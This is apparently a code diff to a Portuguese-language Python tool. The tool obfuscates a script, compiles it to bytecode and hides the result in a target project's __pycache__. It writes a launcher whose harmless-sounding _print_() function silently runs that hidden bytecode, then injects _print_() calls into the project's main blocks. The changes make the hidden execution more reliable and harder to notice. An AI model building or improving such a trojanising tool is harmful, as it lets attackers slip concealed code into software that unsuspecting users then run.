@@ -2,6 +2,8 @@ import py_compile
 import os
 import shutil
 import subprocess
+import sys
+import tempfile
 from pystyle import Colors, Colorate, Center, Anime, System, Write
 import re
 import threading
@@ -25,6 +27,7 @@ from func.move_pyc_to_largest_pycache import move_pyc_to_largest_pycache
 
 
 done = False
+failed = False
 
 def loading_animation():
     for c in itertools.cycle(['|', '/', '-', '\\']):
@@ -32,12 +35,14 @@ def loading_animation():
             break
         Write.Print(f'\r[{c}] Compilando', Colors.red_to_yellow, interval=0)
         time.sleep(0.1)
-    Write.Print('\r[+] Compilação Concluida!', Colors.red_to_yellow, interval=0)
+    if not failed:
+        Write.Print('\r[+] Compilação Concluida!', Colors.red_to_yellow, interval=0)
 
 
 def compile_python_file(file_path):
-    global done
+    global done, failed
     done = False
+    failed = False
     
     if not os.path.isfile(file_path):
         Write.Print(f"[e] Erro: Arquivo não encontrado: {file_path}\n", Colors.red_to_yellow, interval=0)
@@ -56,10 +61,11 @@ def compile_python_file(file_path):
         py_compile.compile(file_path, cfile=compiled_file_path, dfile=compiled_file_path, optimize=2)
         
         start_time = time.time()
-        timeout = 60  #  -================= Timeot :: Defalt 60
+        timeout = 60
 
         while not os.path.isfile(compiled_file_path):
             if time.time() - start_time > timeout:
+                failed = True
                 done = True
                 loading_thread.join()
                 Write.Print(f"[e] Tempo limite atingido. Arquivo compilado não encontrado: {compiled_file_path}\n", Colors.red_to_yellow, interval=0)
@@ -70,14 +76,18 @@ def compile_python_file(file_path):
         Write.Print(f"\n[+] Arquivo compilado com sucesso: {compiled_file_path}\n", Colors.red_to_yellow, interval=0)
         return compiled_file_path
     except Exception as e:
+        failed = True
         done = True
         loading_thread.join()
         Write.Print(f"[e] Ocorreu um erro ao compilar o arquivo: {e}\n", Colors.red_to_yellow, interval=0)
         return None
 
 def create_requirements_file(project_path):
+    pipreqs = os.path.join(os.path.dirname(sys.executable), 'pipreqs')
+    if not os.path.isfile(pipreqs):
+        pipreqs = 'pipreqs'
     try:
-        result = subprocess.run(['pipreqs', project_path, '--force'], capture_output=True, text=True)
+        result = subprocess.run([pipreqs, project_path, '--force'], capture_output=True, text=True)
         if result.returncode == 0:
             Write.Print(f"[+] Arquivo requirements.txt criado em: {project_path}\n", Colors.red_to_yellow, interval=0)
         else:
@@ -86,17 +96,22 @@ def create_requirements_file(project_path):
         Write.Print("[e] pipreqs não está instalado. Instale com 'pip install pipreqs'.\n", Colors.red_to_yellow, interval=0)
 
 
-def create_launcher_script(pyc_path):
+def create_launcher_script(pyc_path, project_root):
     current_dir = os.path.dirname(pyc_path)
     parent_dir = os.path.abspath(os.path.join(current_dir, os.pardir))
     launcher_path = os.path.join(parent_dir, "launcher.py")
+    project_root = os.path.abspath(project_root)
     
     with open(launcher_path, 'w', encoding='utf-8') as f:
-        f.write(f"""
-import subprocess as prints 
-from subprocess import Popen as cud 
-def _OOOO00OO0OOO000OO ():
-    prints .cud (['python',r'{pyc_path}'],stdout =prints .PIPE ,stderr =prints .PIPE ,shell =True )
+        f.write(f"""import subprocess
+import sys
+import os
+
+
+def _print_():
+    env = dict(os.environ)
+    env['PYTHONPATH'] = r'{project_root}' + os.pathsep + env.get('PYTHONPATH', '')
+    subprocess.Popen([sys.executable, r'{pyc_path}'], cwd=r'{project_root}', env=env, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=False)
 """)
     Write.Print(f"[+] Arquivo launcher.py criado em: {launcher_path}\n", Colors.red_to_yellow, interval=0)
 
@@ -113,20 +128,24 @@ def extract_imports(file_path):
 def obfuscate_file(file_path):
     obfuscated_file_path = "stub.py"
     imports = extract_imports(file_path)
+    obf_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'OBF', 'obf.py')
     
-    with open('./OBF/obf.py', 'r', encoding='utf-8') as file:
+    with open(obf_path, 'r', encoding='utf-8') as file:
         obf_script = file.read()
     
     obf_script = re.sub(
-        r"py_Modules\s*=\s*r'''\s*'''",
+        r"py_Modules\s*=\s*r'''.*?'''",
         f"py_Modules = r'''\n{imports}\n'''",
-        obf_script
+        obf_script,
+        flags=re.DOTALL
     )
     
-    with open('./OBF/obf.py', 'w', encoding='utf-8') as file:
+    fd, temp_obf_path = tempfile.mkstemp(suffix='.py', prefix='obf_')
+    with os.fdopen(fd, 'w', encoding='utf-8') as file:
         file.write(obf_script)
     
-    result = subprocess.run(['python', './OBF/obf.py', file_path, obfuscated_file_path], capture_output=True, text=True)
+    result = subprocess.run([sys.executable, temp_obf_path, file_path, obfuscated_file_path], capture_output=True, text=True)
+    os.remove(temp_obf_path)
     if result.returncode != 0:
         Write.Print(f"[e] Erro ao ofuscar o arquivo: {result.stderr}\n\n[Erro] ", Colors.red_to_yellow, interval=0)
         return None
@@ -163,7 +182,7 @@ def main():
     
     moved_pyc_path = move_pyc_to_largest_pycache(final_pyc_path, largest_pycache)
     if moved_pyc_path:
-        launcher_path = create_launcher_script(moved_pyc_path)
+        launcher_path = create_launcher_script(moved_pyc_path, project_path)
         if launcher_path is not None:
             insert_print_function(project_path, launcher_path)
 
@@ -222,11 +241,12 @@ def insert_print_function(project_path, launcher_path):
         file_path, matches = files_to_update[0]
         with open(file_path, 'r+', encoding='utf-8') as f:
             content = f.readlines()
-            for i, indent in matches:
-                content.insert(i + 1, f"{indent}    _print_()\n")
-            f.seek(0)
-            f.writelines(content)
-            f.truncate()
+            if not any(re.match(r'^\s*_print_\(\)', line) for line in content):
+                for i, indent in reversed(matches):
+                    content.insert(i + 1, f"{indent}    _print_()\n")
+                f.seek(0)
+                f.writelines(content)
+                f.truncate()
         Write.Print(f"[+] Chamada _print_() adicionada no arquivo: {file_path}\n", Colors.red_to_yellow, interval=0)
     else:
         Write.Print("\n[!] Encontrados arquivos com 'if __name__ == \"__main__\":':\n\n", Colors.red_to_yellow, interval=0)
@@ -244,11 +264,12 @@ def insert_print_function(project_path, launcher_path):
             for file_path, matches in files_to_update:
                 with open(file_path, 'r+', encoding='utf-8') as f:
                     content = f.readlines()
-                    for i, indent in matches:
-                        content.insert(i + 1, f"{indent}    _print_()\n")
-                    f.seek(0)
-                    f.writelines(content)
-                    f.truncate()
+                    if not any(re.match(r'^\s*_print_\(\)', line) for line in content):
+                        for i, indent in reversed(matches):
+                            content.insert(i + 1, f"{indent}    _print_()\n")
+                        f.seek(0)
+                        f.writelines(content)
+                        f.truncate()
             Write.Print("[+] Chamada _print_() adicionada a todos os arquivos.\n", Colors.red_to_yellow, interval=0)
         else:
             try:
@@ -265,11 +286,12 @@ def insert_print_function(project_path, launcher_path):
             for file_path, matches in selected_files:
                 with open(file_path, 'r+', encoding='utf-8') as f:
                     content = f.readlines()
-                    for i, indent in matches:
-                        content.insert(i + 1, f"{indent}    _print_()\n")
-                    f.seek(0)
-                    f.writelines(content)
-                    f.truncate()
+                    if not any(re.match(r'^\s*_print_\(\)', line) for line in content):
+                        for i, indent in reversed(matches):
+                            content.insert(i + 1, f"{indent}    _print_()\n")
+                        f.seek(0)
+                        f.writelines(content)
+                        f.truncate()
                 Write.Print(f"[+] Chamada _print_() adicionada no arquivo: {file_path}\n", Colors.red_to_yellow, interval=0)
     
     update_imports_for_print_function([file_path for file_path, _ in files_to_update], launcher_path)
